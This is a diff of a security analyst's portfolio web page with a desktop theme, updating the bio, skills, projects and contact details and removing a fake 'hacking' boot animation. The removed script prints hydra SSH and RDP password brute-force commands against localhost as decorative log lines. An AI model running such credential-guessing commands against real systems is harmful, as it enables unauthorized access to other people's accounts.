-    flex-wrap:nowrap!important;
-    overflow-x:auto!important;overflow-y:hidden!important;
-    align-items:center!important;
-    justify-content:flex-start!important;
-    padding:4px 10px!important;
-    background:rgba(13,17,23,0.97)!important;
-    border-top:1px solid var(--border)!important;
-    z-index:9998!important;
-    gap:6px!important;
-    -webkit-overflow-scrolling:touch;
-    scrollbar-width:none;
-  }
-  #desktopIcons::-webkit-scrollbar{display:none;}
-  .icon{
-    width:54px!important;flex-shrink:0!important;
-    padding:5px 4px!important;touch-action:manipulation;
-  }
-  .icon-img{font-size:1.4rem!important;}
-  .icon-label{font-size:0.52rem!important;max-width:52px!important;}
-
-  /* Desktop viewport doesn't go behind icon strip */
-  #desktop{bottom:108px!important;}
-
-  #snakeSidePanel{width:100px!important;}
-  .taskbar-start{padding:0 8px!important;font-size:0.7rem!important;}
-  .taskbar-tasks{display:none!important;}
-}
-@media (max-width: 480px) {
-  #snakeSidePanel{display:none!important;}
-  .taskbar-clock{display:none;}
-}
-
-</style>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-ED9BYX2YY0"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-ED9BYX2YY0');
-</script>
-
+<!-- Styles (loaded in cascade order) -->
+<link rel="stylesheet" href="css/base.css">
+<link rel="stylesheet" href="css/cursor.css">
+<link rel="stylesheet" href="css/loader.css">
+<link rel="stylesheet" href="css/desktop.css">
+<link rel="stylesheet" href="css/windows.css">
+<link rel="stylesheet" href="css/terminal.css">
+<link rel="stylesheet" href="css/theme.css">
+<link rel="stylesheet" href="css/games.css">
+<link rel="stylesheet" href="css/animations.css">
+<link rel="stylesheet" href="css/responsive.css">
 </head>
 <body>
 
-<!-- Custom Cursor -->
-<svg id="customCursor" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
-  <!-- crosshair lines -->
-  <line x1="10" y1="0"  x2="10" y2="7"  stroke="#00ff9d" stroke-width="1.5" opacity="0.9"/>
-  <line x1="10" y1="13" x2="10" y2="20" stroke="#00ff9d" stroke-width="1.5" opacity="0.9"/>
-  <line x1="0"  y1="10" x2="7"  y2="10" stroke="#00ff9d" stroke-width="1.5" opacity="0.9"/>
-  <line x1="13" y1="10" x2="20" y2="10" stroke="#00ff9d" stroke-width="1.5" opacity="0.9"/>
-  <!-- center dot -->
-  <circle cx="10" cy="10" r="1.5" fill="#00ff9d"/>
-</svg>
-<div id="cursorRing"></div>
-
-<!-- HACKING LOADING SCREEN -->
+<!-- ═══════════════════════════ FAST BOOT SCREEN ═══════════════════════════ -->
 <div id="loadingScreen">
-  <canvas id="hackCanvas"></canvas>
-
-  <!-- PHASE 1: TARGET ACQUISITION + BREACH -->
-  <div id="hkPhase1" class="hk-phase">
-    <div class="hk-box">
-      <div class="hk-c tl"></div><div class="hk-c tr"></div>
-      <div class="hk-c bl"></div><div class="hk-c br"></div>
-      <div class="hk-sweep"></div>
-      <div class="hk-label">◈ TARGET ACQUISITION ◈</div>
-      <div class="hk-ip" id="hkIP">0.0.0.0</div>
-      <div class="hk-host" id="hkHost">scanning network...</div>
+  <div class="boot-box">
+    <div class="boot-titlebar">
+      <div class="boot-dot r"></div><div class="boot-dot a"></div><div class="boot-dot g"></div>
+      <div class="boot-label">ankesh@root: boot</div>
     </div>
-    <div class="hk-log" id="hkLog"></div>
-    <div class="hk-prog">
-      <div class="hk-prog-title">BREACH PROGRESS</div>
-      <div class="hk-track"><div class="hk-fill" id="hkFill"></div></div>
-      <div class="hk-pct" id="hkPct">0%</div>
-    </div>
-  </div>
-
-  <!-- PHASE 2: ACCESS GRANTED -->
-  <div id="hkPhase2">
-    <div class="ag-ring"></div>
-    <div class="ag-ring"></div>
-    <div class="ag-ring"></div>
-    <div class="ag-check">&#10003;</div>
-    <div class="ag-title" id="agTitle"></div>
-    <div class="ag-who">IDENTITY VERIFIED &mdash; ANKESH PRAJAPATI</div>
-    <div class="ag-role">&middot; Security Analyst &middot; VAPT</div>
-    <div class="ag-wait">Initializing desktop<span class="ag-dots"></span></div>
+    <div class="boot-lines" id="bootLines"></div>
   </div>
 </div>
 
-<!-- Alert Overlay (Konami) -->
+<!-- Konami code easter-egg overlay -->
 <div class="alert-overlay" id="alertOverlay">
   <div class="alert-title">⚠ RED TEAM MODE ACTIVATED</div>
   <div class="alert-sub">Unauthorized access detected. All systems compromised.</div>
@@ -998,9 +222,10 @@ body.cursor-hover #cursorRing {
 </div>
 
 <!-- WINDOWS -->
+<!-- WINDOWS -->
 
 <!-- About Window -->
-<div class="window" id="win-about" style="width:460px;height:430px;top:60px;left:120px;" data-win="about">
+<div class="window" id="win-about" style="width:460px;top:60px;left:110px;" data-win="about" data-no-cascade="true">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-about')" ontouchstart="startDragTouch(event,'win-about')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('about')"></div>
@@ -1017,23 +242,23 @@ body.cursor-hover #cursorRing {
         <div class="avatar">🧑‍💻</div>
         <div>
           <div class="about-name">Ankesh Prajapati</div>
-          <div class="about-role">Cybersecurity Analyst | VAPT Specialist</div>
+          <div class="about-role">Security Analyst | Penetration Tester</div>
           <div class="about-badge"># India</div>
           <div class="about-badge" style="margin-left:4px;"># Open to Remote</div>
         </div>
       </div>
       <div class="about-bio">
-        Offensive security professional with hands-on VAPT expertise across web, mobile, API, network, and cloud environments. Formerly with State Cyber Crime Cell (CID) conducting digital forensic investigations. Currently delivering 50+ security assessments at Securis360.<br><br>
+        Offensive security professional at Securis360, delivering 60+ VAPT engagements across web, network, mobile, thick-client, cloud, and source code security assessments. Builds internal tooling and automation to speed up assessment workflows alongside client-facing security work. Previously spent time with the State Cyber Crime Cell.<br><br>
         Philosophy: <span style="color:var(--accent)">break first, document properly, help teams fix faster.</span>
       </div>
       <div class="about-stats">
         <div class="stat-box">
-          <div class="stat-num">50+</div>
-          <div class="stat-label">VAPT Assessments</div>
+          <div class="stat-num">60+</div>
+          <div class="stat-label">VAPT Engagements</div>
         </div>
         <div class="stat-box">
-          <div class="stat-num">2+</div>
-          <div class="stat-label">DFIR Investigations</div>
+          <div class="stat-num">6+</div>
+          <div class="stat-label">Security Tools Built</div>
         </div>
         <div class="stat-box">
           <div class="stat-num">2+</div>
@@ -1042,11 +267,11 @@ body.cursor-hover #cursorRing {
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-about')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-about')" ontouchstart="startResizeTouch(event,'win-about')"></div>
 </div>
 
 <!-- Skills Window -->
-<div class="window" id="win-skills" style="width:430px;height:480px;top:80px;left:620px;display:none;" data-win="skills">
+<div class="window" id="win-skills" style="width:430px;top:80px;left:620px;display:none;" data-win="skills">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-skills')" ontouchstart="startDragTouch(event,'win-skills')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('skills')"></div>
@@ -1066,6 +291,10 @@ body.cursor-hover #cursorRing {
           <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="95%"></div></div>
         </div>
         <div class="skill-item">
+          <div class="skill-name">Network & Cloud Security <span>88%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="88%"></div></div>
+        </div>
+        <div class="skill-item">
           <div class="skill-name">Mobile App Testing (Android) <span>85%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="85%"></div></div>
         </div>
@@ -1074,12 +303,8 @@ body.cursor-hover #cursorRing {
           <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="90%"></div></div>
         </div>
         <div class="skill-item">
-          <div class="skill-name">Network & Cloud Review <span>80%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="80%"></div></div>
-        </div>
-        <div class="skill-item">
-          <div class="skill-name">Digital Forensics (DFIR) <span>88%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="88%"></div></div>
+          <div class="skill-name">Thick-Client & Source Code Review <span>82%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:0%" data-w="82%"></div></div>
         </div>
       </div>
       <div class="skill-group">
@@ -1087,7 +312,7 @@ body.cursor-hover #cursorRing {
         <div class="chips">
           <div class="chip">Burp Suite</div><div class="chip">Nessus</div><div class="chip">Nmap</div>
           <div class="chip">Metasploit</div><div class="chip">Wireshark</div><div class="chip">Kali Linux</div>
-          <div class="chip">UFED</div><div class="chip">EnCase</div><div class="chip">Talon</div>
+          <div class="chip">Python</div><div class="chip">Automation Tooling</div>
         </div>
       </div>
       <div class="skill-group">
@@ -1095,16 +320,16 @@ body.cursor-hover #cursorRing {
         <div class="chips">
           <div class="chip">Security Reporting</div><div class="chip">Remediation Guidance</div>
           <div class="chip">Patch Validation</div><div class="chip">Client Communication</div>
-          <div class="chip">Forensic Documentation</div>
+          <div class="chip">Internal Tooling</div>
         </div>
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-skills')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-skills')" ontouchstart="startResizeTouch(event,'win-skills')"></div>
 </div>
 
 <!-- Experience Window -->
-<div class="window" id="win-experience" style="width:450px;height:450px;top:140px;left:200px;display:none;" data-win="experience">
+<div class="window" id="win-experience" style="width:450px;top:140px;left:200px;display:none;" data-win="experience">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-experience')" ontouchstart="startDragTouch(event,'win-experience')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('experience')"></div>
@@ -1121,24 +346,22 @@ body.cursor-hover #cursorRing {
         <div class="timeline-item">
           <div class="timeline-dot"></div>
           <div class="timeline-date">2025 — Present</div>
-          <div class="timeline-role">Security Analyst</div>
+          <div class="timeline-role">Security Analyst & Penetration Tester</div>
           <div class="timeline-company" style="color:var(--accent)">@ Securis360</div>
           <div class="timeline-desc">
-            — Conducting 50+ VAPT assessments on web, mobile, API, and network assets<br>
-            — Building exploitation workflows to validate critical findings<br>
-            — Writing detailed security reports with remediation guidance<br>
+            — 60+ VAPT engagements across web, network, mobile, thick-client, cloud, and source code<br>
+            — Building internal tooling and automation for faster, more accurate assessments<br>
+            — Writing detailed security reports and client-facing deliverables<br>
             — Performing patch validation and posture hardening
           </div>
         </div>
         <div class="timeline-item">
           <div class="timeline-dot"></div>
           <div class="timeline-date">2024 — 2025</div>
-          <div class="timeline-role">Cybersecurity & DFIR Intern</div>
+          <div class="timeline-role">Cybersecurity Intern</div>
           <div class="timeline-company" style="color:var(--highlight)">@ State Cyber Crime Cell (CID)</div>
           <div class="timeline-desc">
-            — Conducted forensic investigations using UFED, EnCase, and Talon<br>
-            — Performed pentesting and vulnerability analysis on government systems<br>
-            — Analyzed fraud patterns and MO-based case support
+            — Assisted with pentesting and vulnerability analysis on government systems
           </div>
         </div>
         <div class="timeline-item">
@@ -1167,11 +390,11 @@ body.cursor-hover #cursorRing {
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-experience')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-experience')" ontouchstart="startResizeTouch(event,'win-experience')"></div>
 </div>
 
 <!-- Projects Window -->
-<div class="window" id="win-projects" style="width:500px;height:420px;top:100px;left:350px;display:none;" data-win="projects">
+<div class="window" id="win-projects" style="width:500px;top:100px;left:350px;display:none;" data-win="projects">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-projects')" ontouchstart="startDragTouch(event,'win-projects')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('projects')"></div>
@@ -1186,45 +409,45 @@ body.cursor-hover #cursorRing {
       <div class="section-title"><span>$</span> ls -la projects/</div>
       <div class="projects-grid">
         <div class="project-card">
-          <div class="project-icon">🔍</div>
-          <div class="project-name">Crime Analysis System</div>
-          <div class="project-desc">Phishing detection engine with weak credential analysis and behaviour-driven crime pattern mapping for law enforcement use.</div>
+          <div class="project-icon">🛡️</div>
+          <div class="project-name">Warden <span style="font-size:0.6rem;color:var(--muted);font-weight:400;">(private)</span></div>
+          <div class="project-desc">Static security analysis tool for Windows thick-client apps — secrets exposure, insecure config, DLL hijacking risk, code-signing verification, and reverse-engineering exposure.</div>
           <div class="project-tags">
-            <span class="project-tag">DFIR</span><span class="project-tag">ML</span><span class="project-tag">Pattern Analysis</span>
+            <span class="project-tag">Python</span><span class="project-tag">Static Analysis</span><span class="project-tag">Thick-Client</span>
           </div>
         </div>
         <div class="project-card">
-          <div class="project-icon">🗺️</div>
-          <div class="project-name">Crime Heat Map</div>
-          <div class="project-desc">Crime density visualization by region with investigator-friendly dashboards and geospatial analytics.</div>
+          <div class="project-icon">🕸️</div>
+          <div class="project-name"><a href="https://github.com/Ankesh-Prajapati/GhostRecon" target="_blank" rel="noopener">GhostRecon</a></div>
+          <div class="project-desc">Zero-dependency OSINT dork engine for building and executing search-engine dorks across Google, Bing, DuckDuckGo, Brave, and Yandex — with curated query modules for recon, file hunting, and bulk execution.</div>
           <div class="project-tags">
-            <span class="project-tag">GIS</span><span class="project-tag">Data Viz</span><span class="project-tag">Python</span>
+            <span class="project-tag">OSINT</span><span class="project-tag">Dorking</span><span class="project-tag">Zero-Dependency</span>
           </div>
         </div>
         <div class="project-card">
-          <div class="project-icon">📊</div>
-          <div class="project-name">Helpline Data System</div>
-          <div class="project-desc">MO-wise crime data processing with visual analytics dashboard for faster law enforcement decision making.</div>
+          <div class="project-icon">🔎</div>
+          <div class="project-name">GhostRecon v2</div>
+          <div class="project-desc">Passive OSINT correlation console — runs seven free-source recon modules (WHOIS/RDAP, DNS, cert-transparency, TLS, HTTP posture, web footprint, breach cross-referencing) and correlates results into a single exposure score. No API keys required.</div>
           <div class="project-tags">
-            <span class="project-tag">Analytics</span><span class="project-tag">Power BI</span><span class="project-tag">ETL</span>
+            <span class="project-tag">OSINT</span><span class="project-tag">Recon</span><span class="project-tag">Correlation Engine</span>
           </div>
         </div>
         <div class="project-card">
-          <div class="project-icon">🌐</div>
-          <div class="project-name">VAPT Reports Suite</div>
-          <div class="project-desc">Structured penetration testing report templates and automated finding documentation used across 50+ client assessments.</div>
+          <div class="project-icon">🎣</div>
+          <div class="project-name"><a href="https://ankesh-prajapati.github.io/PhishAware/" target="_blank" rel="noopener">PhishAware</a></div>
+          <div class="project-desc">Production-ready, frontend-only phishing awareness simulation platform. Runs entirely in the browser, stores progress locally, hosted as a static GitHub Pages site.</div>
           <div class="project-tags">
-            <span class="project-tag">VAPT</span><span class="project-tag">Burp</span><span class="project-tag">Nessus</span>
+            <span class="project-tag">Security Awareness</span><span class="project-tag">JavaScript</span><span class="project-tag">GitHub Pages</span>
           </div>
         </div>
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-projects')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-projects')" ontouchstart="startResizeTouch(event,'win-projects')"></div>
 </div>
 
 <!-- Certifications Window -->
-<div class="window" id="win-certs" style="width:420px;height:440px;top:90px;left:500px;display:none;" data-win="certs">
+<div class="window" id="win-certs" style="width:420px;top:90px;left:500px;display:none;" data-win="certs">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-certs')" ontouchstart="startDragTouch(event,'win-certs')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('certs')"></div>
@@ -1239,8 +462,6 @@ body.cursor-hover #cursorRing {
       <div class="section-title"><span>$</span> select * from certifications order by level desc</div>
       <div class="cert-item"><div class="cert-icon">🏆</div><div><div class="cert-name">Certified Ethical Hacker (CEH)</div><div class="cert-org">Cisco Networking Academy</div></div></div>
       <div class="cert-item"><div class="cert-icon">🔐</div><div><div class="cert-name">Certified Network Security Practitioner (CNSP)</div><div class="cert-org">The SecOps Group</div></div></div>
-      <div class="cert-item"><div class="cert-icon">🔬</div><div><div class="cert-name">Windows Forensics</div><div class="cert-org">Belkasoft</div></div></div>
-      <div class="cert-item"><div class="cert-icon">🔬</div><div><div class="cert-name">Advanced Digital Forensics Techniques</div><div class="cert-org">Belkasoft</div></div></div>
       <div class="cert-item"><div class="cert-icon">🎓</div><div><div class="cert-name">Junior Cybersecurity Analyst</div><div class="cert-org">Cisco Networking Academy</div></div></div>
       <div class="cert-item"><div class="cert-icon">🛡️</div><div><div class="cert-name">Endpoint Security</div><div class="cert-org">Cisco Networking Academy</div></div></div>
       <div class="cert-item"><div class="cert-icon">⚠️</div><div><div class="cert-name">Cyber Threat Management</div><div class="cert-org">Cisco Networking Academy</div></div></div>
@@ -1250,11 +471,11 @@ body.cursor-hover #cursorRing {
       <div class="cert-item"><div class="cert-icon">💻</div><div><div class="cert-name">JavaScript Algorithms and Data Structures</div><div class="cert-org">freeCodeCamp</div></div></div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-certs')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-certs')" ontouchstart="startResizeTouch(event,'win-certs')"></div>
 </div>
 
 <!-- Contact Window -->
-<div class="window" id="win-contact" style="width:380px;height:320px;top:200px;left:300px;display:none;" data-win="contact">
+<div class="window" id="win-contact" style="width:380px;top:200px;left:300px;display:none;" data-win="contact">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-contact')" ontouchstart="startDragTouch(event,'win-contact')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('contact')"></div>
@@ -1272,7 +493,7 @@ body.cursor-hover #cursorRing {
           <div class="contact-icon">📧</div>
           <div>
             <div class="contact-label">Email</div>
-            <div class="contact-val"><a href="/cdn-cgi/l/email-protection#44252a2f21372c3436252e253425302d767573042329252d286a272b29"><span class="__cf_email__" data-cfemail="8aebe4e1eff9e2faf8ebe0ebfaebfee3b8bbbdcaede7ebe3e6a4e9e5e7">[email&#160;protected]</span></a></div>
+            <div class="contact-val"><a href="mailto:ankeshprajapati217@gmail.com">ankeshprajapati217@gmail.com</a></div>
           </div>
         </div>
         <div class="contact-item">
@@ -1286,20 +507,27 @@ body.cursor-hover #cursorRing {
           <div class="contact-icon">🔗</div>
           <div>
             <div class="contact-label">LinkedIn</div>
-            <div class="contact-val"><a href="https://linkedin.com/in/ankesh-prajapati-0a87a8249" target="_blank">ankesh-prajapati-0a87a8249</a></div>
+            <div class="contact-val"><a href="https://linkedin.com/in/ankesh-prajapati-0a87a8249" target="_blank" rel="noopener">ankesh-prajapati-0a87a8249</a></div>
+          </div>
+        </div>
+        <div class="contact-item">
+          <div class="contact-icon">🐙</div>
+          <div>
+            <div class="contact-label">GitHub</div>
+            <div class="contact-val"><a href="https://ankesh-prajapati.github.io" target="_blank" rel="noopener">ankesh-prajapati.github.io</a></div>
           </div>
         </div>
         <div class="contact-item">
           <div class="contact-icon">📍</div>
           <div>
             <div class="contact-label">Location</div>
-            <div class="contact-val"> India</div>
+            <div class="contact-val">India</div>
           </div>
         </div>
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-contact')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-contact')" ontouchstart="startResizeTouch(event,'win-contact')"></div>
 </div>
 
 <!-- Terminal Window -->
@@ -1328,7 +556,7 @@ body.cursor-hover #cursorRing {
 </div>
 
 <!-- Neofetch Window -->
-<div class="window" id="win-neofetch" style="width:620px;height:420px;top:180px;left:180px;display:none;" data-win="neofetch">
+<div class="window" id="win-neofetch" style="width:620px;top:70px;left:610px;display:none;" data-win="neofetch" data-no-cascade="true">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-neofetch')" ontouchstart="startDragTouch(event,'win-neofetch')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('neofetch')"></div>
@@ -1360,17 +588,19 @@ body.cursor-hover #cursorRing {
         <span class="nf-key">Terminal:</span> <span class="nf-val">Terminator + tmux</span><br>
         <span class="nf-key">Location:</span> <span class="nf-val">India</span><br>
         <span class="nf-key">Uptime:</span>&nbsp;&nbsp; <span class="nf-val" id="nfUptime">calculating...</span><br>
-        <span class="nf-key">VAPT:</span>&nbsp;&nbsp;&nbsp;&nbsp; <span class="nf-val">50+ Assessments</span><br>
+        <span class="nf-key">VAPT:</span>&nbsp;&nbsp;&nbsp;&nbsp; <span class="nf-val">60+ Engagements</span><br>
         <br>
         <span style="background:#ff5f57;padding:0 7px;border-radius:2px">&nbsp;</span>&nbsp;<span style="background:#febc2e;padding:0 7px;border-radius:2px">&nbsp;</span>&nbsp;<span style="background:#28c840;padding:0 7px;border-radius:2px">&nbsp;</span>&nbsp;<span style="background:#00ff9d;padding:0 7px;border-radius:2px">&nbsp;</span>&nbsp;<span style="background:#58a6ff;padding:0 7px;border-radius:2px">&nbsp;</span>&nbsp;<span style="background:#ff3355;padding:0 7px;border-radius:2px">&nbsp;</span>
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-neofetch')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-neofetch')" ontouchstart="startResizeTouch(event,'win-neofetch')"></div>
 </div>
 
 <!-- Wallpaper Picker Window -->
-<div class="window" id="win-wallpaper" style="width:540px;height:520px;top:80px;left:260px;display:none;" data-win="wallpaper">
+
+<!-- Wallpaper Picker Window -->
+<div class="window" id="win-wallpaper" style="width:540px;top:80px;left:260px;display:none;" data-win="wallpaper">
   <div class="win-titlebar" onmousedown="startDrag(event,'win-wallpaper')" ontouchstart="startDragTouch(event,'win-wallpaper')">
     <div class="win-dots">
       <div class="win-dot close" onclick="closeWindow('wallpaper')"></div>
@@ -1417,1696 +647,8 @@ body.cursor-hover #cursorRing {
       </div>
     </div>
   </div>
-  <div class="win-resize" onmousedown="startResize(event,'win-wallpaper')"></div>
+  <div class="win-resize" onmousedown="startResize(event,'win-wallpaper')" ontouchstart="startResizeTouch(event,'win-wallpaper')"></div>
 </div>
-
-<script>
-// ══════════════════════════════════════════════════════
-// HACKING LOADING SCREEN
-// ══════════════════════════════════════════════════════
-(function(){
-
-  // ── Canvas rain ──────────────────────────────────────
-  var cv = document.getElementById("hackCanvas");
-  if(!cv) return;
-  var cx = cv.getContext("2d");
-  function rzCv(){ cv.width=window.innerWidth; cv.height=window.innerHeight; }
-  rzCv();
-  window.addEventListener("resize", rzCv);
-
-  var RC = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%@><:/|{}[]";
-  var RFS = 13, rcols, rdrops;
-  function initR(){
-    rcols=Math.floor(cv.width/RFS);
-    rdrops=[];
-    for(var i=0;i<rcols;i++) rdrops.push(-(Math.random()*60|0));
-  }
-  initR();
-  window.addEventListener("resize",initR);
-  var rainID=setInterval(function(){
-    cx.fillStyle="rgba(0,0,0,0.13)";
-    cx.fillRect(0,0,cv.width,cv.height);
-    cx.font=RFS+"px monospace";
-    for(var i=0;i<rcols;i++){
-      var b=Math.random();
-      cx.fillStyle=b>.96?"#ccffee":b>.87?"rgba(0,255,157,0.7)":"rgba(0,255,157,0.35)";
-      cx.fillText(RC[Math.floor(Math.random()*RC.length)],i*RFS,rdrops[i]*RFS);
-      if(rdrops[i]*RFS>cv.height && Math.random()>.97) rdrops[i]=0;
-      rdrops[i]++;
-    }
-  },40);
-
-  // ── Elements ─────────────────────────────────────────
-  var ipEl   = document.getElementById("hkIP");
-  var hostEl = document.getElementById("hkHost");
-  var logEl  = document.getElementById("hkLog");
-  var fillEl = document.getElementById("hkFill");
-  var pctEl  = document.getElementById("hkPct");
-
-  if(!ipEl || !logEl){ clearInterval(rainID); initDesktop(); initDesktopBg(); return; }
-
-  // ── Step 1: IP address count-up from 000.000.000.000 ──
-  // Target: 127.0.0.1
-  var TARGET = [127,0,0,1];
-  var cur    = [0,0,0,0];
-  var ipDone = false;
-
-  function showIP(){ ipEl.textContent=cur[0]+"."+cur[1]+"."+cur[2]+"."+cur[3]; }
-  showIP();
-
-  var ipInterval=setInterval(function(){
-    var done=true;
-    for(var i=0;i<4;i++){
-      if(cur[i]<TARGET[i]){ cur[i]+=1; done=false; break; }
-    }
-    // Also randomly flicker other octets while incrementing
-    if(!done && Math.random()<0.4){
-      var ri=Math.floor(Math.random()*4);
-      if(cur[ri]<TARGET[ri]) cur[ri]=Math.min(TARGET[ri], cur[ri]+(Math.random()*8|0)+1);
-    }
-    showIP();
-    if(done){
-      clearInterval(ipInterval);
-      cur=[127,0,0,1];
-      showIP();
-      if(hostEl){ hostEl.textContent="localhost · ankesh@root"; }
-      setTimeout(startBreach, 400);
-    }
-  }, 30);
-
-  // ── Step 2: Hack sequence ─────────────────────────────
-  var STEPS=[
-    {t:"SCAN", c:"#febc2e", m:"Starting Nmap 7.95 (https://nmap.org)"},
-    {t:"SCAN", c:"#febc2e", m:"Scanning 127.0.0.1 for open ports..."},
-    {t:"PORT", c:"#58a6ff", m:"22/tcp   open  ssh     OpenSSH 8.9p1"},
-    {t:"PORT", c:"#58a6ff", m:"80/tcp   open  http    nginx 1.24.0"},
-    {t:"PORT", c:"#58a6ff", m:"443/tcp  open  https   ssl/nginx"},
-    {t:"PORT", c:"#58a6ff", m:"3389/tcp open  rdp     RDP"},
-    {t:"WARN", c:"#febc2e", m:"SSH service exposed — checking banner..."},
-    {t:"INFO", c:"#c9d1d9", m:"Banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu"},
-    {t:"WARN", c:"#febc2e", m:"RDP detected — attempting credential bypass"},
-    {t:"EXEC", c:"#ff5f57", m:"hydra -l admin -P /wordlists/rdp.txt rdp://127.0.0.1"},
-    {t:"EXEC", c:"#ff5f57", m:"hydra -l root -P /wordlists/ssh.txt ssh://127.0.0.1"},
-    {t:"HIT!", c:"#ff5f57", m:"[22][ssh] host: 127.0.0.1 login: root pass: ****"},
-    {t:"ROOT", c:"#00ff9d", m:"Privilege escalation complete — uid=0(root)"},
-    {t:"INFO", c:"#c9d1d9", m:"Loading identity registry..."},
-    {t:"OK  ", c:"#00ff9d", m:"Identity: ANKESH PRAJAPATI"},
-    {t:"OK  ", c:"#00ff9d", m:"✔ ACCESS AUTHORIZED — mounting desktop..."}
-  ];
-
-  var si=0;
-
-  function startBreach(){ nextStep(); }
-
-  function nextStep(){
-    if(si>=STEPS.length){ setTimeout(showAccessGranted,300); return; }
-    var s=STEPS[si++];
-    var d=document.createElement("div");
-    d.className="hkln";
-    d.innerHTML="<span style='color:"+s.c+";font-weight:600'>["+s.t+"]</span>"
-              +" <span style='color:#c9d1d9'>"+s.m+"</span>";
-    logEl.appendChild(d);
-    logEl.scrollTop=99999;
-
-    var pct=Math.min(99,Math.round(si/STEPS.length*100));
-    fillEl.style.width=pct+"%";
-    pctEl.textContent=pct+"%";
-
-    // Glitch flash
-    if(Math.random()<0.18){
-      fillEl.style.background="linear-gradient(90deg,#ff0040,#00c8ff)";
-      setTimeout(function(){fillEl.style.background="";},110);
-    }
-
-    var delay=300+Math.random()*350;
-    if(s.t==="HIT!" || s.t==="ROOT") delay+=400;
-    if(s.t==="OK  ") delay+=250;
-    setTimeout(nextStep,delay);
-  }
-
-  // ── Step 3: ACCESS GRANTED ─────────────────────────────
-  function showAccessGranted(){
-    fillEl.style.width="100%";
-    pctEl.textContent="100%";
-    setTimeout(function(){
-      var p1=document.getElementById("hkPhase1");
-      var p2=document.getElementById("hkPhase2");
-      if(p1) p1.style.display="none";
-      if(p2){ p2.style.display="flex"; p2.style.flexDirection="column"; p2.style.alignItems="center"; }
-
-      var titleEl=document.getElementById("agTitle");
-      if(titleEl){
-        var txt="ACCESS GRANTED", ti=0;
-        var tw=setInterval(function(){
-          titleEl.textContent=txt.slice(0,++ti);
-          if(ti>=txt.length) clearInterval(tw);
-        },68);
-      }
-      setTimeout(finishLoad, 2400);
-    },500);
-  }
-
-  function finishLoad(){
-    clearInterval(rainID);
-    var ls=document.getElementById("loadingScreen");
-    if(!ls) return;
-    ls.style.opacity="0";
-    setTimeout(function(){
-      if(ls.parentNode) ls.parentNode.removeChild(ls);
-      initDesktop();
-      initDesktopBg();
-    },900);
-  }
-
-})();
-
-// ══════════════════════════════════════════════════════
-// DESKTOP ANIMATED BACKGROUND — particle network
-// ══════════════════════════════════════════════════════
-function initDesktopBg(){
-  var cv=document.getElementById("desktopBg");
-  if(!cv)return;
-  var ctx=cv.getContext("2d");
-  var W,H;
-  function rz(){W=cv.width=cv.offsetWidth||window.innerWidth;H=cv.height=cv.offsetHeight||(window.innerHeight-44);}
-  rz();window.addEventListener("resize",function(){rz();initParticles();});
-
-  var particles=[];
-  var COUNT=65;
-  var CONNECT_DIST=200;
-
-  function initParticles(){
-    particles=[];
-    for(var i=0;i<COUNT;i++){
-      particles.push({
-        x:Math.random()*W,
-        y:Math.random()*H,
-        vx:(Math.random()-0.5)*0.35,
-        vy:(Math.random()-0.5)*0.35,
-        r:1+Math.random()*1.5,
-        pulse:Math.random()*Math.PI*2
-      });
-    }
-  }
-  initParticles();
-
-  // Data packets travelling along edges
-  var packets=[];
-  var pkTimer=0;
-
-  function draw(){
-    ctx.clearRect(0,0,W,H);
-    ctx.fillStyle="#0d1117";
-    ctx.fillRect(0,0,W,H);
-
-    // get accent color from CSS var
-    var accent=getComputedStyle(document.documentElement).getPropertyValue('--accent-rgb').trim()||"0,255,157";
-
-    // update + draw particles
-    for(var i=0;i<particles.length;i++){
-      var p=particles[i];
-      p.x+=p.vx; p.y+=p.vy; p.pulse+=0.02;
-      if(p.x<0||p.x>W) p.vx*=-1;
-      if(p.y<0||p.y>H) p.vy*=-1;
-    }
-
-    // draw connections
-    for(var i=0;i<particles.length;i++){
-      for(var j=i+1;j<particles.length;j++){
-        var a=particles[i],b=particles[j];
-        var dx=a.x-b.x, dy=a.y-b.y;
-        var dist=Math.sqrt(dx*dx+dy*dy);
